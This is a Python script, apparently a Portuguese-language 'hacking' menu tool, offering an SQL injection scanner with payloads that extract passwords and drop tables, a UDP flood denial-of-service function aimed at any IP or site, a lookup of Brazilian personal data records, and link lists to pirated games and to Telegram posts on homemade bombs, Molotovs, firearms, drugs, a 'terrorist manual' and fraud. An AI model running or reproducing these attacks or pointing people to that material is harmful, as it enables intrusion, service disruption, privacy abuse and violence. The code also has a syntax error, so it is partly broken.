import socket
import requests
import random
import time
import os
from faker import Faker
from colorama import Fore
import whois
import platform
from dados import *
sistema = platform.system()

dados = {
    "1": dado1,
    "2": dado2,
    "3": dado3,
    "4": dado4,
    "5": dado5,
    "6": dado6,
    "7": dado7,
    "8": dado8,
    "9": dado9,
    "10": dado10,
    "11": dado11,
    "12": dado12,
    "13": dado13,
    "14": dado14,
    "15": dado15,
    "16": dado16,
    "17": dado17,
    "18": dado18,
    "19": dado19,
    "20": dado20,
    "21": dado21,
    "22": dado22,
    "23": dado23,
    "24": dado24,
    "25": dado25,
    "26": dado26,
    "27": dado27,
    "28": dado28,
    "29": dado29,
    "30": dado30,
    "31": dado31,
    "32": dado32,
    "33": dado33,
    "34": dado34,
    "35": dado35,
    "36": dado36,
    "37": dado37,
    "38": dado38,
    "39": dado39,
    "40": dado40,
    "41": dado41,
}

def limpar():
     if sistema == "Windows"
         os.system("cls")
     else:
         os.system("clear")

def backmenu():
    backmenu = input("[+] Voltar ao menu?(sim/não): ")
    if backmenu in ["ss", "sim", "s"]:
        menu()
    else:
        limpar()
        exit()

def iplookup(ip):
    urlapi = f"https://ipinfo.io/{ip}/json"
    try:
        requisição = requests.get(urlapi)
        if requisição.status_code == 200:
            responsejson = requisição.json()
            dados = responsejson
            return dados
        else:
            return None
    except requests.RequestException as e:
        return None

def linksjogos():
    print("""				Links de Joguinhos 👾

DOOM android 🔥: https://t.me/undergrupo/55370

Dota android: https://t.me/undergrupo/55372

Minecraft 1.21.80 🔥🔥: https://upload.app/download/minecraft/com.mojang.minecraftpe/4e24fe51c065a2133366fa1689b3ada933c5c2b0b98bfa902a8d5b1ed9adbe7f?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8163

Ark Mobile (Jogo de Dinossauro) 🔥🔥: https://d.apkpure.com/b/XAPK/com.studiowildcard.arkuse?version=latest

Hello Neighbour 🔥: https://d.apkpure.com/b/XAPK/com.tinybuildgames.helloneighbor?version=latest

Good Pizza Great Pizza! 🔥: https://d.apkpure.com/b/APK/com.tapblaze.pizzabusiness?version=latest

NARUTO: Ultimate Ninja STORM 1.2.6 (Download Gratuito, Recursos Ilimitados) 🔥🔥: https://upload.app/download/naruto-ultimate-ninja-storm/com.bandainamcoent.ultimateninjastorm/d1f9ef499d189872d69100e98a90d6196e34a8077b4be759fb135d6b313fd713?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8140

Drift Max 15.4 (Dinheiro Ilimitado) 🔥: https://upload.app/download/drift-max/tr.com.tiramisu.driftmax/4ee62a5b90a2d2660fb020af907c62b491f6126db6a1a6217ba0ea0824bae8e7?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8140

Car Parking Multiplayer Mod APK 4.9.2: https://upload.app/download/car-parking/com.olzhas.carparking.multyplayer/3d8e59f934c3c87a4b8481201c92663c1fb32a43ae78570bc9a0c05b4d23650d?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8145

Soul Knight: https://upload.app/download/soul-knight/com.ChillyRoom.DungeonShooter/24577dd6896d9fb1564c92d9c45b620de9a98a12ab54b2b4a407d15a99e3ac4f?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8144

Hello Neighbour Nicky´s Diaries: https://upload.app/download/hello-neighbor-nicky-s-diaries/com.tinybuildgames.hndiaries/8ccebeea6041243548e60d3fd96a2742df60b5796ba674401c8f6a0d49b25228?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=8056

PPSSPP Gold 🔥🔥: https://files.an1.net/ppsspp-gold_1.18.1-an1.com.apk

The Walking Zombie 2: Shooter 🔥: https://upload.app/download/the-walking-zombie-2/com.aldagames.zombieshooter/9f7ad3830710c9801cc7114bee91e513fe46f72b3cd4a009ba12cc7841832195?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7990

Melon Sandbox APK 28.5.1 🔥: https://apkpure.com/br/melon-sandbox/com.studio27.MelonPlayground?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7959

Dude Theft Wars (GTA de baixa qualidade) 🔥: https://upload.app/download/dude-theft-wars/com.PoxelStudios.DudeTheftAuto/0f561269fb2d053b8ff3a81778b2f1524a8643f392bdd9981c50e1bc49b33e3c?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7958

Universal Truck Simulator: https://upload.app/download/universal-truck-simulator/com.dualcarbon.universaltrucksimulator/b4d84143e9b018b0576e0b6b5f4bde107051d102821425b4a587d1256c97b88c?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7885

House Flipper 🔥: https://upload.app/download/house-flipper/com.imaginalis.HouseFlipperMobile/fa37df13ae37e5418b0bf43aac4cdc270710c8e48c5da0c6217701704c343943?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7815

Block Blast! : https://upload.app/download/block-blast/com.block.juggle/00a1fe556427943c44606a309d582f6f15e1c807c68ae1e94a4e07a9a78b276b?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7800

Bright Memory: Infinite 🔥: https://upload.app/download/bright-memory-infinite/com.FYQD.BMI/54c47c90e364dc399e2d0da54a991731da7ea234040fc5a31a31456db162bbe9?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7798

KRNL Executor (Roblox) 🔥🔥: https://upload.app/download/krnl-executor/com.roblox.client/9ed3e8edb5b0fc1de33f2ceebffdd9600d4b2fc56f1c47dcea787a1157d0e490?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7762

Digging a Hole simulator 🔥: https://upload.app/download/digging-a-hole-simulator/com.youngster.hole/a7fc4125b2f648dda468bdb9adc06d5159ba79d1246dcdf5cd3cbb82f113ced6?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7706

R.E.P.O Mobile 🔥: https://upload.app/download/r-e-p-o-mobile/com.sandswept.repo/a6ec024be61927b6b2de18417e2b13fc0226bebfa0c9df5c589589f8c5fabf9f?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7701

Chicken Gun: https://upload.app/download/chicken-gun/com.chaloapps.roosterrudy/02bbeb5d53d1d3e2c9efc19607fa09484638174a3cf72d495a819b84cad5ce72?utm_source=tg&utm_campaign=AppHunter-BR&utm_medium=content&utm_term=7687

GTA San Andreas - The Definitive Edition 🔥🔥🔥: https://gofile.io/d/Frs5N0?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8155

Tekken 8 🔥🔥: https://gofile.io/d/I9opk8?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=7091

Fifa 23 🔥: https://gofile.io/d/weT7jM?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6785

Palworld 🔥🔥: https://gofile.io/d/D2ZMrz?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6594

Far Cry 6 🔥🔥🔥: https://gofile.io/d/5WzB4a?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6803

Forza Horizon 5 🔥🔥🔥: https://gofile.io/d/QaJLW5?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6840

Dragon Ball: Sparking Zero 🔥🔥: https://gofile.io/d/ARmFuX?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=6840

 Marvel’s Spider-Man: Miles Morales 🔥🔥: https://gofile.io/d/YdXO3l?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=7099

Marvel´s Spider man - Remastered 🔥🔥: https://gofile.io/d/A8o86m?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8077

The Last of Us Part II 🔥: https://gofile.io/d/3FylJR?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8155

Five Nights at Freddy’s: Into the Pit 🔥🔥: https://gofile.io/d/8XC18b?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8077

Stray 🔥🔥: https://gofile.io/d/Wi0L2S?utm_source=tg&utm_campaign=pcgames_freedownload&utm_medium=content&utm_term=8077

          
(Quanto mais foguinho melhor o jogo)
          
""")
    backmenu()

payloads = [
    "' OR '1'='1' -- ",
    "' OR '1'='1' /* ",
    "' OR '1'='1' # ",
    "' OR '1'='1' AND ''='' ",
    "' AND 1=CONVERT(int, (SELECT @@version)) -- ",
    "' AND 1=2 -- ",
    "' AND (SELECT COUNT(*) FROM users) > 0 -- ",
    "' UNION SELECT NULL, username, password FROM users -- ",
    "' UNION SELECT 1, 'test', 'test' -- ",
    "' UNION SELECT 1, database(), user() -- ",
    "' OR IF(1=1, SLEEP(5), 0) -- ",
    "' OR IF(1=2, SLEEP(5), 0) -- ",
    "' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 0 -- ",
    "' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a' -- ",
    "' AND 'a'='a' -- ",
    "' AND 'a'='b' -- ",
    "'; DROP TABLE users; -- ",
    "'; SELECT * FROM users; -- ",
    "' OR '1'='1' /* comment */ ",
    "' OR '1'='1' -- comment"
]

def sqliscan():
    url = input("[+] Insira a URL(exemplo: http://example.com/page.php): ").lower()
    if url.startswith("https://") or url.startswith('http://'):
        for payload in payloads:
            try:
                urlsql = f"{url}?id={payload}"
                response = requests.get(urlsql)
                if "sql" in response.text.lower() or "error" in response.text.lower():
                    print(Fore.LIGHTGREEN_EX + f"[+] Vulnerabilidade encontrada em: {urlsql}")
                    print(Fore.LIGHTWHITE_EX + "\r")
                else:
                    print("\r")
            except requests.RequestException as e:
                print(Fore.LIGHTRED_EX + f"[+] Erro ao tentar contato com a url: {url} , Erro: {e}")
                print(Fore.LIGHTWHITE_EX + f"\r")
    else:
        print(Fore.LIGHTRED_EX + "[+] Insira uma url válida!")
        print(Fore.LIGHTWHITE_EX + "\r")
    backmenu()

def domainlookupres():
    site = input("[+] Insira o domínio: ")
    try:
        siteinfo = whois.whois(site)
        print(f"[+] Mostrando informações para: {site}")
        print(f"[+] Nome do domínio: {siteinfo.name}")
        print(f"[+] Registrar: {siteinfo.registrar}")
        print(f"[+] Data de criação: {siteinfo.creation_date}")
        print(f"[+] Data de expiração: {siteinfo.expiration_date}")
        print(f"[+] Status: {siteinfo.status}")
        backmenu()
    except Exception as e:
        print(f"[+] Erro ao consultar o domínio {site}, Erro: {e}.")
        backmenu()

def ddos(target):
    bytesend = random._urandom(9999)
    targetip = target.split()[0]
    if targetip.endswith((".com", ".net", ".gov", ".br", ".org")):
        targetip = socket.gethostbyname(targetip)
    targetport = int(target.split()[1])
    numpackets = int(target.split()[2])
    sent = 0
    for i in range(numpackets):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(bytesend, (targetip, targetport))
        sent += 1
        print(f"[+] Packet {sent} enviado ao IP: {targetip} pela Porta: {targetport}")
    print(f"\n[+] Ataque DoS finalizado com um total de {sent} packets enviados.")
    backmenu()

def gerardadosfic():
    numdados = int(input("[+] Quantos dados gerar? "))
    faker = Faker()
    generolista = ["MASCULINO", "FEMININO"]
    cor = ['BRANCA', 'PRETA', 'PARDA', 'VERMELHA', 'AMARELA']
    ddd = [
    11,  # São Paulo
    12,  # São Paulo
    13,  # São Paulo
    14,  # São Paulo
    15,  # São Paulo
    16,  # São Paulo
    17,  # São Paulo
    18,  # São Paulo
    19,  # São Paulo
    21,  # Rio de Janeiro
    22,  # Rio de Janeiro
    24,  # Rio de Janeiro
    27,  # Espírito Santo
    28,  # Espírito Santo
    31,  # Minas Gerais
    32,  # Minas Gerais
    33,  # Minas Gerais
    34,  # Minas Gerais
    35,  # Minas Gerais
    37,  # Minas Gerais
    38,  # Minas Gerais
    41,  # Paraná
    42,  # Paraná
    43,  # Paraná
    44,  # Paraná
    45,  # Paraná
    46,  # Paraná
    47,  # Santa Catarina
    48,  # Santa Catarina
    49,  # Santa Catarina
    51,  # Rio Grande do Sul
    53,  # Rio Grande do Sul
    54,  # Rio Grande do Sul
    55,  # Rio Grande do Sul
    61,  # Distrito Federal
    62,  # Goiás
    63,  # Tocantins
    64,  # Goiás
    65,  # Mato Grosso
    66,  # Mato Grosso
    67,  # Mato Grosso do Sul
    68,  # Acre
    69,  # Rondônia
    71,  # Bahia
    73,  # Bahia
    74,  # Bahia
    75,  # Bahia
    77,  # Bahia
    79,  # Sergipe
    81,  # Pernambuco
    82,  # Alagoas
    83,  # Paraíba
    84,  # Rio Grande do Norte
    85,  # Ceará
    86,  # Piauí
    87,  # Pernambuco
    88,  # Ceará
    89,  # Piauí
    91,  # Pará
    92,  # Amazonas
    93,  # Pará
    94,  # Pará
    95,  # Roraima
    96,  # Amapá
    97,  # Amazonas
    98,  # Maranhão
    99   # Maranhão
]
    for i in range(numdados):
        telefonestr = f"({random.choice(ddd)}) {random.randint(0000, 99999)}-{random.randint(0000, 9999)}"
        nome = faker.name()
        genero = random.choice(generolista)
        datadenascimento = faker.date_of_birth()
        coraca = random.choice(cor)
        municipionasc = faker.city()
        telefone = telefonestr
        endereço = faker.address()
        print(Fore.LIGHTRED_EX + f"""
        ======================================
        Nome: {nome}
        Sexo: {genero}
        Data de Nascimento: {datadenascimento}
        Raça: {coraca}
        Município de Nascimento: {municipionasc}
        Telefone: {telefone}
        Endereço: {endereço}
        ======================================""")
    print(Fore.LIGHTWHITE_EX + "\r")
    backmenu()
    

def linksper():
    print("""
                Arquivos 📂 perigosos

VPN Ilimitada para android: https://t.me/undergrupo/62585

SMS Bomber Android: https://t.me/undergrupo/62569

Drogas Caseiras: https://t.me/undergrupo/46484

Bombas: https://t.me/undergrupo/46488

Dorks: https://t.me/undergrupo/46480

Como não ser rastreado: https://t.me/undergrupo/46473

Como fazer Molotov: https://t.me/undergrupo/50418

Manual do Terrorista BR (Use com responsabilidade): https://t.me/undergrupo/50415

Como pegar Kit Bico: https://t.me/undergrupo/43513

Como virar saldo: https://t.me/undergrupo/43511

Armas Caseiras (Pistola automática): https://t.me/undergrupo/43510

Armas Caseiras (Pistola): https://t.me/undergrupo/43509

Armas Caseiras (Shotgun): https://t.me/undergrupo/43508

Armas Caseiras (Submetralhadora): https://t.me/undergrupo/43507

Curso Hacking (Inglês): https://t.me/undergrupo/63617
          
""")
    backmenu()

def dadosver():
    num = input("[+] Insira um número (máx. 41): ")
    if num in dados:
        print(Fore.LIGHTRED_EX + f"{dados[num].strip()}")
        print(Fore.LIGHTWHITE_EX + "\n")
    else:
        print(f"[+] Não foi possivel encontrar o dado '{num}' em nosso banco de dados")
    backmenu()
        
def startddos():
    iportnum = input("[+] Insira o IP ou site, a porta e o número de packets (exemplo: 192.168.1.1 443 1000) ")
    ddos(iportnum)

def iplookresult():
    ip = input("[+] Insira o IP: ")
    dados = iplookup(ip)
    if dados:
        print(f"[+] Dados sobre o ip: {ip}")
        print(f"[+] Cidade: {dados.get("city")}")
        print(f"[+] Estado: {dados.get("region")}")
        print(f"[+] País: {dados.get("country")}")
        print(f"[+] Localização: {dados.get("loc")}")
        print(f"[+] Organização: {dados.get("org")}")
        print(f"[+] Código Postal: {dados.get("postal")}")
        print(f"[+] Fuso Horário: {dados.get("timezone")}")
        backmenu()
    else:
        print(Fore.LIGHTRED_EX + f"[+] Erro ao consultar o IP: {ip}")
        print(Fore.RESET + "\r")
        backmenu()

def ipbyurl(site):
    if site.endswith((".com", ".br", ".org", ".net", ".gov")):
        try:
            ip = socket.gethostbyname(site)
            return ip
        except Exception as e:
            return None
    else:
        return f"[+] Não foi possível retornar o ip da url: {site}"
    
def ipbyurlres():
    site = input("[+] Insira a URL: ")
    resultado = ipbyurl(site)
    print(f"[+] O IP de {site} é {resultado}")
    backmenu()

def tor():
    print("[+] Ativando Tor...")
    time.sleep(1.5)
    os.system("tor")

def banner():
    print(Fore.LIGHTWHITE_EX + """
                 ██████╗ ██╗     ██╗  ██╗ ██████╗     ███████╗████████╗███████╗██████╗ ███╗   ██╗ ██████╗ 
                ██╔═══██╗██║     ██║  ██║██╔═══██╗    ██╔════╝╚══██╔══╝██╔════╝██╔══██╗████╗  ██║██╔═══██╗
                ██║   ██║██║     ███████║██║   ██║    █████╗     ██║   █████╗  ██████╔╝██╔██╗ ██║██║   ██║
                ██║   ██║██║     ██╔══██║██║   ██║    ██╔══╝     ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██║   ██║
                ╚██████╔╝███████╗██║  ██║╚██████╔╝    ███████╗   ██║   ███████╗██║  ██║██║ ╚████║╚██████╔╝
                 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝     ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                          

                Feito por: Berkxp
                github do criador: https://github.com/Berkxp                                                                                                    

""")

def menuhacking():
    while True:
        limpar()
        banner()
        print("""
                                                 ______________________________
                                                |                              |
                                                |────[1] SqlI Scan             |
                                                |                              |
                                                |────[2] DoS                   |
                                                |                              |
                                                |────[3] IP by URL             |
                                                |                              |
                                                |────[4] IP Lookup             |
                                                |                              |
                                                |────[5] Domain Lookup         |
                                                |                              |
                                                |────[6] Activate Tor          |            
                                                |                              |
                                                |────[0] Voltar ao menu        |
                                                |                              |
                                                |────[Q] Quit                  |
                                                |______________________________|
""")
        option = input("[+] Qual opção? ").lower()
        if option == "1" or option == "01": sqliscan()
        elif option == "2" or option == "02": startddos()
        elif option == "3" or option == "03": ipbyurlres()
        elif option == "4" or option == "04": iplookresult()
        elif option == "5" or option == "05": domainlookupres()
        elif option == "6" or option == "06": tor()
        elif option == "0" or option == "00": menu()
        elif option == "q" or option == "Q":
            limpar()
            exit()
        else:
            print("[+] Opção Inválida")
            time.sleep(1)
            limpar()
            menuhacking()

def links():
    while True:
        limpar()
        banner()
        print("""
                                                 ______________________________
                                                |                              |
                                                |────[1] Links Perigosos       |
                                                |                              |
                                                |────[2] Links de Jogos        |
                                                |                              |
                                                |────[0] Voltar ao Menu        |
                                                |                              |
                                                |────[Q] Quit                  |
                                                |______________________________|
""")
        option = input("[+] Qual opção? ")
        if option == "1" or option == "01": linksper()
        elif option == "2" or option == "02": linksjogos()
        elif option == "0" or option == "00": menu()
        elif option == "2" or option == "02": limpar(), exit()
        else:
            limpar()
            print("[+] Opção Inválida")
            time.sleep(1)
            links()


def menu():
    while True:
        limpar()
        banner()
        print("""
                                             ______________________________
                                            |                              |
                                            |────[1] Dados                 |
                                            |                              |
                                            |────[2] Hacking               |
                                            |                              |
                                            |────[3] Links                 |
                                            |                              |
                                            |────[Q] Quit                  |
                                            |______________________________|
                            

""")
        print(Fore.LIGHTWHITE_EX + "\r")
        option = input("[+] Qual opção? ").lower()
        if option == "1" or option == "01":
            limpar()
            banner()
            print("""
                                             ______________________________          
                                            |                              |
                                            |────[1] Dados Pessoais BR     |
                                            |                              |
                                            |────[2] Gerar Dados Fictícios |
                                            |                              |
                                            |────[0] Voltar ao menu        |
                                            |                              |
                                            |────[Q] Quit                  |
                                            |______________________________|
                                            
""")
            optiondados = input("[+] Qual opção? ").lower()
            if optiondados == "1" or optiondados == "01": dadosver()
            elif optiondados == "2" or optiondados == "02": gerardadosfic()
            elif optiondados == "0" or optiondados == "00": menu()
            elif optiondados == "q": limpar(), exit()
            else:
                print("[+] Opção Inválida")
                time.sleep(2)
                limpar()
                menu()
        elif option == "2" or option == "02": menuhacking()
        elif option == "3" or option == "03": links()
        elif option == "q": limpar(), exit()
        else:
            print("[+] Opção Inválida")
            time.sleep(2)
            limpar()
            menu()





